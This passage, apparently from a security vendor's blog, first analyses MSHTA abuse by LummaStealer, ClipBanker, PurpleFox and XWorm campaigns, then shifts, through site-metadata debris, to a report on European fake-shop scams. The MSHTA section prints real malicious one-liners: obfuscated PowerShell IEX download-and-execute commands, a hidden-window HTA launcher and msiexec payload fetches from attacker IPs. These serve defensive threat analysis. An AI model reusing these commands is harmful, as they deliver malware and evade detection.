big Base64-encoded string, followed by three lines of code that decode the Base64 and load the resulting byte array as an assembly.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003E$bytes = [System.Convert]::FromBase64String($a);\n[Reflection.Assembly]$assembly = [System.AppDomain]::CurrentDomain.Load($bytes) # Load Assembly\n$assembly.EntryPoint.Invoke($null, @())\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThis loader is most often used to execute commodity malware on the infected system. In the case we analyzed, the assembly that was executed is a well-known LummaStealer assembly (1E0E375F3EE82D5AF5DFE6F7DF0E2FAC9A7D37C67ADD3390D05A93AFD85B7C84) that contains C2 domains associated with the Lumma infrastructure.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-9.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"472\" height=\"476\"\u003E\u003C\u002Ffigure\u003E\u003Ch2 id=\"clipbanker\"\u003EClipBanker\u003C\u002Fh2\u003E\u003Cp\u003EAnother MSHTA-driven cluster in our telemetry involved ClipBanker [8], a malware family primarily designed to steal cryptocurrency by replacing wallet addresses in the victim’s clipboard. In this infection chain, MSHTA serves as an early-stage execution mechanism that launches a remote HTA and then quickly transitions to PowerShell-based persistence and payload delivery.\u003C\u002Fp\u003E\u003Cp\u003EThe HTA executed from the remote location hxxps[:\u002F\u002F]asd[.]s7610rir[.]pw\u002Fwin\u002Fchecking[.]hta is a simple script that hides the MSHTA window by moving it to negative coordinates, creates a Wscript Shell object and runs a Base64-encoded PowerShell command.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003E&lt;HTML&gt;\n&lt;meta http-equiv=\"Content-Type\" content=\"text\u002Fhtml; charset=utf-8\"&gt;\n&lt;HEAD&gt;\n&lt;script language=\"VBScript\"&gt;\n        Window.ReSizeTo 0, 0\n        Window.moveTo -2000,-2000\n        Function var_func()\n                Dim var_shell\n                Set var_shell = CreateObject(\"Wscript.Shell\")\n                var_shell.run \"cmd \u002Fc powershell.exe -w 1 -NoProfile -InputFormat None -ExecutionPolicy Bypass -e &lt;redacted_b64_command&gt;, 0, true\n        End Function\n\n        var_func\n&lt;\u002Fscript&gt;\n&lt;body&gt;\n&lt;\u002Fbody&gt;\n&lt;\u002FHEAD&gt;\n&lt;\u002FHTML&gt;\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe command downloads the second stage from hxxp[:\u002F\u002F]185[.]208[.]159[.]199, which is a Powershell file called checking.ps1 (333E2192F2551415659FB4094E81B911708921BB588EECF65E27F51C9938DFC2). \u003C\u002Fp\u003E\u003Cp\u003EThe role of this script is to ensure Windows Defender exclusions and persistence, which executes the ClipBanker downloader obtained from: hxxp[:\u002F\u002F]87[.]96[.]21[.]84\u002Fichigo-lite[.]ps1 (38FE562136ADE372FC4CEDDE67826AEEA8404E93A54A4A4736DDB4C8C8D4C96D).\u003C\u002Fp\u003E\u003Cp\u003EThe scheduled task names masquerade as services that sound legitimate (e.g., Optimize Start Menu Cache Files-S-3-5-21-2236678155-433529325-1142214968-1237).\u003C\u002Fp\u003E\u003Cp\u003EFinally, a cleanup script gets executed, downloaded from hxxp[:\u002F\u002F]87[.]96[.]21[.]84\u002Fdel[.]ps1 (7D0487AFC91B0FE8B2FBF732AB54C3C07E86BF69471BBA6C283AABEA190499BA). \u003C\u002Fp\u003E\u003Cp\u003EThis script cleans up the files used during the attack and terminates processes that might have been involved in dynamic analysis in a sandbox (e.g., Procmon, Autoruns).\u003C\u002Fp\u003E\u003Ch2 id=\"purplefoxeven-sophisticated-threats-use-mshta\"\u003EPurpleFox - even sophisticated threats use MSHTA\u003C\u002Fh2\u003E\u003Cp\u003EMSHTA is not only used in commodity-stealing and loader campaigns. It also appears in delivery chains associated with PurpleFox [9], a more advanced and persistent malware family that has remained active for years.\u003C\u002Fp\u003E\u003Cp\u003EThis is important because it shows that MSHTA is useful not only for lightweight initial infection stages, but also for malware operations focused on stealth, persistence, and long-term control of the compromised system.\u003C\u002Fp\u003E\u003Cp\u003ESince emerging in 2018, PurpleFox has continued to expand its arsenal and remains active in 2026. One of its long-standing delivery methods, however, has remained consistent: launching msiexec from an MSHTA command line in order to download and execute an MSI package disguised as a .png file.\u003C\u002Fp\u003E\u003Cp\u003EThe command lines are recognizable by the list of IP addresses they attempt to contact and by the .png file that is ultimately executed through msiexec:\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Emshta.exe vbscript:createobject(\"wscript.shell\").run(\"Cmd \u002Fc for \u002Fd %i in (195[.]189[.]28[.]244:17807 103[.]124[.]106[.]194:18413 58[.]221[.]59[.]20:17256 ) do Msiexec \u002Fi http:\u002F\u002F%i\u002F3EBCE3A4.Png \u002FQ\",0)(window.close)\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EOnce installed, PurpleFox functions as a rootkit-enabled backdoor whose primary objectives are to remain hidden, establish persistence, and execute on-demand commands from its C2 infrastructure. \u003C\u002Fp\u003E\u003Cp\u003EThese capabilities can support a wide range of malicious activity, including information theft, surveillance, and disruptive actions such as DDoS attacks.\u003C\u002Fp\u003E\u003Ch2 id=\"mshta-and-powershellan-intermediary-step-in-multi-stage-attacks\"\u003EMSHTA and PowerShell - an intermediary step in multi-stage attacks\u003C\u002Fh2\u003E\u003Cp\u003EOur telemetry shows multiple smaller clusters of PowerShell executions via MSHTA, where MSHTA creates a wscript shell that runs the PowerShell process to execute the loader responsible for downloading the next stage.\u003C\u002Fp\u003E\u003Cp\u003EWe observed obfuscation techniques unique to each campaign, aiming to mask keywords that trigger alerts in EDRs and SIEMs.\u003C\u002Fp\u003E\u003Cp\u003EThe first category features URLs that appear to link to image files but actually contain a PowerShell script downloaded and executed in memory. These IPs are typically used by XWorm\u002FDanabot. PowerShell keywords are split into multiple tokens to bypass detection.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Emshta.exe\" vbscript:close(CreateObject(\"WScript.Shell\").Run(\"powershell $L='(New-Object Net.We';$Y='bClient).Downlo';$V='adString(''http:\u002F\u002F92[.]255[.]57[.]155\u002Fb.jpg'')';$F=I`E`X ($L,$Y,$V -Join '')|I`E`X\",0))\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EA variation of the XWorm command line adds junk characters, which are removed by the String.Replace method.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Emshta.exe\" vbscript:close(CreateObject(\"WScript.Shell\").Run(\"powershell IEX(('#!!i!Qw#Q!r #8###5#.!!!2###0!!8#.8###4!!.2!!!0###8!\u002F#x!!!.j###pg# |#i!!e!!!!x#').RePlACE('Q','').REplAcE('!','').rEpLAce('#',''))\",0))\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe next category involves the Lalala information stealer, where the script is delivered only if the POST request to the PHP script includes a predefined password. Other PowerShell keywords remain unobfuscated.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Emshta.EXE\" vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell Invoke-Expression -Command:(iwr -uri 185[.]156[.]172[.]22\u002Fgate990.php -method post -body gieM3iR5).content\"\", 0 : window.close\")\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EAnother cluster of PowerShell commands executes scripts previously downloaded in the chain. This delivery method is noisier because it allows scanning the script file for malware.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Emshta.EXE\" vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell -ep bypass -File \"\"\"\"C:\\Users\\U_f8d33485bec26b2b1969f910c131f027\\AppData\\Roaming\\Adobe\\peyneKzk2.ps1 \"\"\"\"\"\" ,0:close\")\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe final major category involves command lines where the URL is encoded and stored in local variables. The one-liner decodes the URL and executes the downloaded payload in memory.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Emshta.exe\" vbscript:close(CreateObject(\"WScript.Shell\").Run(\"powershell $Z='aXdyIGh0dHBzOi8vMHg0NC5pbmZvL2F8aWV4';$B=[System.Convert]::FromBase64String($Z);$D=[System.Text.Encoding]::UTF8.GetString($B);iex $D\",0))\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Ch2 id=\"driverpackan-example-of-legitimate-usage\"\u003EDriverPack - an example of legitimate usage\u003C\u002Fh2\u003E\u003Cp\u003ENot every MSHTA execution we observed was clearly malicious. A significant portion of detections came from DriverPack's update mechanism, an older software package that downloads driver files from third-party sources rather than through official Microsoft update channels.\u003C\u002Fp\u003E\u003Cp\u003EAlthough DriverPack is not inherently malicious, many security vendors classify some of its components as potentially unwanted applications (PUA).\u003C\u002Fp\u003E\u003Cp\u003EIn the cases we analyzed, DriverPack used a scheduled task to launch mshta.exe, which then executed an HTA in memory to check for updates or ensure that the latest version of the software was installed.\u003C\u002Fp\u003E\u003Cp\u003EWhile this appears to serve a legitimate software-maintenance purpose, the method is unorthodox and overlaps with techniques commonly used in malicious delivery chains.\u003C\u002Fp\u003E\u003Cp\u003EThis is an important reminder that MSHTA usage is not automatically malicious. At the same time, using MSHTA to retrieve and execute remote content as part of an update workflow is not a recommended design choice, especially when more modern and transparent alternatives are available.\u003C\u002Fp\u003E\u003Ch2 id=\"recommended-user-and-organizational-mitigations\"\u003ERecommended user and organizational mitigations\u003C\u002Fh2\u003E\u003Cp\u003EDefense against MSHTA-related attacks generally falls into two broad categories: user awareness and behavior, and the implementation of technical security controls.\u003C\u002Fp\u003E\u003Cp\u003EMany of the attack chains presented in this article rely on user interaction. In some cases, users are persuaded to download software or media from untrusted websites that promise free or cracked content. In others, they are manipulated through social engineering into willingly executing malicious commands copied to the clipboard. For this reason, user education remains an important line of defense.\u003C\u002Fp\u003E\u003Cp\u003EUsers should be informed about these tactics and regularly reminded of the risks associated with downloading untrusted files, following suspicious instructions, or executing commands they do not fully understand.\u003C\u002Fp\u003E\u003Cp\u003ETechnical mitigations are equally important. MSHTA-based attacks usually do not rely on a single malicious file, but on a chain of script execution, command-line abuse, in-memory stages, and follow-on payload delivery. That is why protection needs to cover multiple points in the attack chain, from attack surface reduction to pre-execution detection and runtime behavioral blocking.\u003C\u002Fp\u003E\u003Cp\u003EBitdefender employs various technologies to detect these attacks as part of its layered defense strategy, all of which are integrated into Bitdefender’s security solutions.\u003C\u002Fp\u003E\u003Cp\u003EUntil Microsoft removes legacy scripting utilities that are still present by default in Windows, users can reduce exposure by ensuring that they run a comprehensive security solution, such as \u003Ca href=\"https:\u002F\u002Fwww.bitdefender.com\u002Fen-us\u002Fconsumer\u002Fultimate-security\"\u003E\u003Cstrong\u003EBitdefender Ultimate Security\u003C\u002Fstrong\u003E\u003C\u002Fa\u003E\u003Cstrong\u003E.\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cp\u003EAdditionally, \u003Ca href=\"https:\u002F\u002Fwww.bitdefender.com\u002Fen-us\u002Fbusiness\u002Fproducts\u002Fthreat-intelligence-solutions?_gl=1*b2kr29*_ga*MTQzMDAyODk0LjE3NzAxOTcwMjY.*_ga_6M0GWNLLWF*czE3Nzc5NjM5Nzkkbzc5JGcxJHQxNzc3OTYzOTg5JGo1MCRsMCRoODc0MzM4NjE5*_gcl_aw*R0NMLjE3NzY0MzAyMTguQ2p3S0NBand0SWZQQmhBekVpd0F2OVJUSnJPRHFwNDJEZmtGLS1CMG9wOWFIRXM3X3dWbTJzeFdMX0tDb010ZnhqSHdEdHNEU25vZkhSb0NYTXNRQXZEX0J3RQ..*_gcl_au*MjAxNjczMTk1OC4xNzc2MjQzODYw*FPAU*MjAxNjczMTk1OC4xNzc2MjQzODYw\" rel=\"noopener noreferrer\"\u003E\u003Cstrong\u003EBitdefender Threat Intelligence Solutions\u003C\u002Fstrong\u003E\u003C\u002Fa\u003E help organizations detect, investigate, and respond to cyber threats faster by providing real-time intelligence on malicious files, URLs, domains, and IPs. Delivered through feeds, APIs, and the IntelliZone portal, the solutions support both security teams and security vendors with actionable threat data, contextual insights, and automated integrations for stronger cybersecurity operations.\u003C\u002Fp\u003E\u003Cp\u003EIn environments where they are no longer required for legitimate workflows, binaries such as wscript.exe and mshta.exe should be restricted or blocked, and older scripts should be migrated to more modern and maintainable alternatives wherever possible.\u003C\u002Fp\u003E\u003Ch1 id=\"iocs\"\u003EIoCs\u003C\u002Fh1\u003E\u003Ch3 Established 2001.","https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2020\u002F10\u002Fbdlabs_logo_orig-3.png","#15171A","https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2020\u002F10\u002F600x200.jpeg","bitdefender","@bitdefenderlabs","Europe\u002FIstanbul","Home","\u002Ftag\u002Fantimalware-research\u002F","\u002Ftag\u002Ffree-tools\u002F","\u002Ftag\u002Fwhitepapers\u002F","https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2020\u002F10\u002Ftwitter-card.jpeg","noreply","icon-and-text","Subscribe","free","monthly","off","hotforsecurity@bitdefender.com","noreply@blogapp.bitdefender.com","visibility","https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002F","5.101",{},"fr","\u003Cp\u003ECybercriminals are scaling fake online stores into a coordinated multinational business.\u003C\u002Fp\u003E\u003Cp\u003EA Bitdefender Labs investigation identified more than 55 fake-shop campaigns targeting consumers across 12 European countries between March and May 2026. The campaigns mimicked some of the world’s most recognizable brands, including Samsung, Nike, Adidas, ZARA, H&amp;M, Amazon, Lidl, and SHEIN.\u003C\u002Fp\u003E\u003Cp\u003EAttackers used Facebook ads, WhatsApp messages, email campaigns, SMS messages, phone calls and fraudulent websites to lure victims into making payments, sharing personal information or buying fake goods.\u003C\u002Fp\u003E\u003Cp\u003EBitdefender researchers mapped more than 40 domains associated with these operations and observed repeat tactics that linked campaigns across multiple countries. Some operators relied on rotating domains and misleading redirects. Others built counterfeit supply chains through WhatsApp and password-protected catalogs. Several campaigns exploited anticipation surrounding the 2026 FIFA World Cup.\u003C\u002Fp\u003E\u003Cp\u003EThe findings show that fake-shop operations have evolved far beyond isolated scam websites. Many now resemble professional e-commerce businesses with advertising budgets, localization strategies and infrastructure designed to evade detection.\u003C\u002Fp\u003E\u003Ch2 id=\"key-takeaways\"\u003EKey takeaways\u003C\u002Fh2\u003E\u003Cul\u003E\n\u003Cli\u003EResearchers identified more than 55 confirmed fake-shop campaigns targeting consumers across Europe.\u003C\u002Fli\u003E\n\u003Cli\u003EAttackers impersonated Samsung, Nike, Adidas, ZARA, H&amp;M, Amazon, Lidl, SHEIN and other major brands.\u003C\u002Fli\u003E\n\u003Cli\u003ESocial media ads and WhatsApp emerged as the most-abused channels.\u003C\u002Fli\u003E\n\u003Cli\u003ESeveral campaigns exploited FIFA World Cup 2026 excitement.\u003C\u002Fli\u003E\n\u003Cli\u003EOperators reused infrastructure across countries and brands.\u003C\u002Fli\u003E\n\u003Cli\u003ERedirect chains, Unicode lookalike domains, domain rotation, and localized content helped attackers evade detection.\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Ch2 id=\"by-the-numbers\"\u003EBy the numbers\u003C\u002Fh2\u003E\u003Cblockquote\u003E\n\u003Cul\u003E\n\u003Cli\u003E55+ confirmed fake-shop campaigns.\u003C\u002Fli\u003E\n\u003Cli\u003E15+ impersonated brands.\u003C\u002Fli\u003E\n\u003Cli\u003E12 European countries targeted.\u003C\u002Fli\u003E\n\u003Cli\u003E40+ fake domains mapped.\u003C\u002Fli\u003E\n\u003Cli\u003E6 attack channels observed.\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fblockquote\u003E\n\u003Cp\u003EThe investigation tracked coordinated campaigns operating between \u003Cstrong\u003EMarch and May 2026\u003C\u002Fstrong\u003E across social media platforms, WhatsApp, email, SMS, phone calls, and fraudulent e-commerce websites.\u003C\u002Fp\u003E\u003Ch2 id=\"fake-shop-campaigns-spread-across-europe\"\u003EFake-shop campaigns spread across Europe\u003C\u002Fh2\u003E\u003Cp\u003EBitdefender security researchers have observed confirmed activity across the EU and the United Kingdom, including Germany, France, Italy, Poland, Spain, the Netherlands, Sweden, Portugal, Austria, Ireland and Romania.\u003C\u002Fp\u003E\u003Cp\u003EThe campaigns appeared on multiple channels:\u003C\u002Fp\u003E\u003Cul\u003E\n\u003Cli\u003ESocial media advertisements\u003C\u002Fli\u003E\n\u003Cli\u003EWhatsApp messages\u003C\u002Fli\u003E\n\u003Cli\u003EEmail campaigns\u003C\u002Fli\u003E\n\u003Cli\u003ESMS campaigns\u003C\u002Fli\u003E\n\u003Cli\u003EPhone calls\u003C\u002Fli\u003E\n\u003Cli\u003EDedicated fake e-commerce websites\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003ERather than relying on a single fraudulent storefront, many operators rotated domains, changed brands, and adapted messaging to local audiences.\u003C\u002Fp\u003E\u003Ch2 id=\"social-media-ads-impersonate-trusted-brands\"\u003ESocial media ads impersonate trusted brands\u003C\u002Fh2\u003E\u003Ch3 id=\"samsung-galaxy-s26-ultra-offered-at-90-discounts\"\u003ESamsung Galaxy S26 Ultra offered at 90% discounts\u003C\u002Fh3\u003E\u003Cp\u003EOne campaign promoted Samsung Galaxy S26 Ultra devices for only €249 while advertising discounts of up to 90%.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F06\u002Fsamsung.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"468\" height=\"468\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EThe operation targeted German consumers through Facebook advertisements and used domains such as:\u003C\u002Fp\u003E\u003Cul\u003E\n\u003Cli\u003Eshopintertec[.]com\u003C\u002Fli\u003E\n\u003Cli\u003Eshop.zppzddw[.]shop\u003C\u002Fli\u003E\n\u003Cli\u003Eshop.fjjfxxz[.]shop\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EResearchers found a mix of unrelated advertising personas promoting the same fraudulent offer. The campaign generated substantial engagement, including hundreds of thousands of ad views.\u003C\u002Fp\u003E\u003Cp\u003EResearchers also saw a Netherlands-based variant that abused KPN branding. According to the investigation, ads promised Samsung-related offers through what appeared to be KPN-affiliated promotions, then redirected users to the fraudulent storefront crowndistrictstore[.]com.\u003C\u002Fp\u003E\u003Ch3 id=\"zara-and-nike-campaigns-shared-the-same-infrastructure\"\u003EZARA and Nike campaigns shared the same infrastructure\u003C\u002Fh3\u003E\u003Cp\u003EResearchers also identified a Polish hub operating through notcia[.]shop that impersonated both ZARA and Nike.\u003C\u002Fp\u003E\u003Cp\u003EThe ZARA campaign advertised Italian fashion products and seasonal collections while directing shoppers to fake storefronts at the same time. The Nike campaign promoted apparel and requested detailed delivery information, including home addresses and postal codes.\u003C\u002Fp\u003E\u003Cp\u003EResearchers also linked related domains to the operation, including:\u003C\u002Fp\u003E\u003Cul\u003E\n\u003Cli\u003Enebularaless[.]info\u003C\u002Fli\u003E\n\u003Cli\u003Eshryxla-mynx[.]icu\u003C\u002Fli\u003E\n\u003Cli\u003Eisblkx[.]shop\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EBoth campaigns used the same domain, notcia.shop, and the same advertising identity, suggesting an operational link between the ZARA and Nike impersonation activities. The Nike campaign also requested detailed delivery information, including house numbers and postal codes.\u003C\u002Fp\u003E\u003Cp\u003EMoreover, these campaigns seek to gather personal information from their targets. The website states the following (translated from Polish):\u003C\u002Fp\u003E\u003Cblockquote\u003E\n\u003Cp\u003E“Please provide your exact delivery address (including street address, house number, and postal code), otherwise we cannot guarantee product delivery! Thank you for your cooperation! Processing time: Ships within 48-72 hours of payment. Money-back guarantee.”\u003C\u002Fp\u003E\n\u003C\u002Fblockquote\u003E\n\u003Ch3 id=\"fake-hm-sales-targeted-italian-shoppers\"\u003EFake H&amp;M sales targeted Italian shoppers\u003C\u002Fh3\u003E\u003Cp\u003EAnother campaign promoted heavily discounted clothing through cyberloria[.]cfd.\u003C\u002Fp\u003E\u003Cp\u003EThis operation primarily targeted consumers in Italy and used Facebook advertisements that imitated legitimate H&amp;M promotions. Attackers exploited brand recognition and discount claims to drive traffic toward a suspicious domain unrelated to the actual retailer.\u003C\u002Fp\u003E\u003Ch2 id=\"whatsapp-becomes-a-counterfeit-marketplace\"\u003EWhatsApp becomes a counterfeit marketplace\u003C\u002Fh2\u003E\u003Ch3 id=\"the-%E2%80%9Csupplier-carl%E2%80%9D-counterfeit-network\"\u003EThe “Supplier Carl” counterfeit network\u003C\u002Fh3\u003E\u003Cp\u003EBitdefender researchers also uncovered a China-based operator calling himself “Carl” who contacted European users through WhatsApp. The messages promoted “1:1 quality” counterfeit products, including Nike, Adidas, Jordan, Golden Goose, various watches, luxury accessories and much more.\u003C\u002Fp\u003E\u003Cp\u003EVictims were directed toward password-protected Yupoo catalogs, including:\u003C\u002Fp\u003E\u003Cul\u003E\n\u003Cli\u003Ecarl-album.x.yupoo[.]com\u003C\u002Fli\u003E\n\u003Cli\u003Eadidas555.x.yupoo[.]com\u003C\u002Fli\u003E\n\u003Cli\u003Egolden-goose.x.yupoo[.]com\u003C\u002Fli\u003E\n\u003Cli\u003Exy666999.x.yupoo[.]com\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EThe messages indicated that the operator offers DHL shipping to Europe and researchers observed the same infrastructure being promoted to users in Germany, France, and Italy.\u003C\u002Fp\u003E\u003Cp\u003EHere is an example of such a message (original text): \u003C\u002Fp\u003E\u003Cblockquote\u003E\n\u003Cp\u003E“Nice to meet you, my name is Carl, I am a supplier from China. I specialize in 1:1 quality, I have shoes, clothes, bags, belts, watches, sunglasses and other products. About shipping. The express delivery for European countries is DHL, the shipping time is about 7-12 days. The express delivery for other countries is FedEx and the shipping time is 7 days. Here are some of my yupoo products. Please click to view. If you like the item, please send me a picture and I will tell you the price.”\u003C\u002Fp\u003E\n\u003C\u002Fblockquote\u003E\n\u003Ch3 id=\"adidas-world-cup-fan-kit-scams\"\u003EAdidas World Cup Fan-Kit scams\u003C\u002Fh3\u003E\u003Cp\u003EAnother campaign targeted German users with messages promising free Adidas Deutschland 2026 Fan Kits.\u003C\u002Fp\u003E\u003Cp\u003EThe operation distributed thousands of WhatsApp messages and relied on redirect infrastructure such as:\u003C\u002Fp\u003E\u003Cul\u003E\n\u003Cli\u003Elinkrdr[.]cc\u003C\u002Fli\u003E\n\u003Cli\u003Erewardpillar[.]cc\u003C\u002Fli\u003E\n\u003Cli\u003Edealgo[.]cc\u003C\u002Fli\u003E\n\u003Cli\u003Eofferpilot[.]cc\u003C\u002Fli\u003E\n\u003Cli\u003Emsgdeal[.]cc\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EThe campaign exploited enthusiasm for the FIFA World Cup to convince recipients that they had won exclusive promotional merchandise.\u003C\u002Fp\u003E\u003Ch3 id=\"unicode-lookalike-domains-bypass-traditional-checks\"\u003EUnicode lookalike domains bypass traditional checks\u003C\u002Fh3\u003E\u003Cp\u003EResearchers also identified campaigns that abused visually deceptive domains—a surprisingly common tactic. Not everyone checks the actual URLs of the websites they open, and attackers know this all too well.\u003C\u002Fp\u003E\u003Cp\u003EExamples included:\u003C\u002Fp\u003E\u003Cul\u003E\n\u003Cli\u003Eadidȧs[.]com\u003C\u002Fli\u003E\n\u003Cli\u003Eṇike[.]com\u003C\u002Fli\u003E\n\u003Cli\u003Eniḳe[.]com\u003C\u002Fli\u003E\n\u003Cli\u003Erołex[.]com\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EThese domains appeared legitimate to human users while remaining technically different from authentic brand domains. The campaigns typically promised free shoes, watches, coupons, or anniversary gifts.\u003C\u002Fp\u003E\u003Ch2 id=\"email-sms-and-phone-scams-expand-the-ecosystem\"\u003EEmail, SMS, and phone scams expand the ecosystem\u003C\u002Fh2\u003E\u003Ch3 id=\"shein-themed-email-campaigns\"\u003ESHEIN-themed email campaigns\u003C\u002Fh3\u003E\u003Cp\u003ESecurity researchers also identified a large-scale email operation impersonating SHEIN order-confirmation messages.\u003C\u002Fp\u003E\u003Cp\u003EThe campaign relied on domains including:\u003C\u002Fp\u003E\u003Cul\u003E\n\u003Cli\u003Esheinnotice[.]com\u003C\u002Fli\u003E\n\u003Cli\u003Esheinemail[.]com\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EThe attackers tried to make the messages look authentic through localized European content and retailer-themed branding. One unusual indicator involved legal documentation hosted on Google Drive rather than official websites.\u003C\u002Fp\u003E\u003Ch3 id=\"counterfeit-world-cup-merchandise-stores\"\u003ECounterfeit World Cup merchandise stores\u003C\u002Fh3\u003E\u003Cp\u003EResearchers also observed counterfeit merchandise campaigns exploiting FIFA World Cup 2026 interest.\u003C\u002Fp\u003E\u003Cp\u003EAssociated domains included:\u003C\u002Fp\u003E\u003Cul\u003E\n\u003Cli\u003Efootballiscrazy[.]com\u003C\u002Fli\u003E\n\u003Cli\u003Eunitedfutballjersey[.]com\u003C\u002Fli\u003E\n\u003Cli\u003Ekicksfireshoes.com[.]co\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EThe operators promoted jerseys and football merchandise through email and SMS campaigns targeting European fans.\u003C\u002Fp\u003E\u003Ch3 id=\"amazon-clone-sites-and-subscription-traps\"\u003EAmazon clone sites and subscription traps\u003C\u002Fh3\u003E\u003Cp\u003EAmazon branding emerged as one of the most frequently observed in terms of impersonation attempts during the investigation.\u003C\u002Fp\u003E\u003Cp\u003EResearchers identified:\u003C\u002Fp\u003E\u003Cul\u003E\n\u003Cli\u003Efeasino[.]shop\u003C\u002Fli\u003E\n\u003Cli\u003Eamazon-clone-*.vercel[.]app\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EThese operations seemed to be designed to exploit consumer trust in the Amazon brand to collect payment information and potentially enroll users in unwanted subscription schemes.\u003C\u002Fp\u003E\u003Ch2 id=\"established-fake-shop-networks-continue-operating\"\u003EEstablished fake-shop networks continue operating\u003C\u002Fh2\u003E\u003Ch3 id=\"homborg-online-handel-runs-a-rotating-network-of-german-fake-shops\"\u003EHomborg Online Handel runs a rotating network of German fake shops\u003C\u002Fh3\u003E\u003Cp\u003EOne of the most mature operations identified during the investigation was a network operating under variations of the name “Homborg Online Handel.” \u003C\u002Fp\u003E\u003Cp\u003EThe German consumer protection association \u003Ca href=\"https:\u002F\u002Fverbraucherschutz.de\u002F\"\u003EVerbraucherschutz Deutschland online e.V.\u003C\u002Fa\u003E has published warnings about the operation, which reportedly runs multiple professional-looking online stores that target shoppers with attractive pricing and what look like legitimate checkout experiences.\u003C\u002Fp\u003E\u003Cp\u003EAccording to the investigation, the storefronts advertise multiple payment options, including card payments and PayPal, but ultimately accept only SEPA advance bank transfers during checkout. Because bank transfers offer limited recourse once funds are sent, victims face serious challenges recovering their money.\u003C\u002Fp\u003E\u003Cp\u003EResearchers observed a pattern of rapid domain rotation. When one domain is removed or blocked, another appears shortly afterward. As of May 2026, the network included domains such as:\u003C\u002Fp\u003E\u003Cul\u003E\n\u003Cli\u003Ealpinvolt[.]de\u003C\u002Fli\u003E\n\u003Cli\u003Ekaimoro[.]de\u003C\u002Fli\u003E\n\u003Cli\u003Ehavro[.]de\u003C\u002Fli\u003E\n\u003Cli\u003Ekavri[.]de\u003C\u002Fli\u003E\n\u003Cli\u003Eheyomi[.]de\u003C\u002Fli\u003E\n\u003Cli\u003Enorya[.]de\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EThis extensive operation shows how fake-shop networks increasingly resemble legitimate e-commerce businesses, complete with professional storefronts, customer-service workflows, and infrastructure designed to survive enforcement efforts.\u003C\u002Fp\u003E\u003Ch3 id=\"romanian-fake-order-calls\"\u003ERomanian fake-order calls\u003C\u002Fh3\u003E\u003Cp\u003EAnother operation relied on telephone calls. Victims received calls claiming they had already placed an online order. Attackers pressured recipients to confirm purchases, provide personal information, or complete payments for products they never requested.\u003C\u002Fp\u003E\u003Cp\u003EThe products varied widely, from fashion items to health supplements and household goods.\u003C\u002Fp\u003E\u003Ch3 id=\"lidl-themed-fake-shops\"\u003ELidl-themed fake shops\u003C\u002Fh3\u003E\u003Cp\u003EResearchers also found Lidl impersonation campaigns delivered through sponsored search advertisements. The fake storefronts visually mimicked Lidl branding and appeared directly within search results, making it more likely that consumers would mistake them for legitimate retailer listings.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F06\u002Flidl.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"468\" height=\"233\"\u003E\u003C\u002Ffigure\u003E\u003Ch2 id=\"fake-shops-are-becoming-professionalized\"\u003EFake shops are becoming professionalized\u003C\u002Fh2\u003E\u003Cp\u003EThe investigation shows how fake-shop operators increasingly combine paid advertising, messaging platforms, counterfeit supply chains, and localized social engineering into 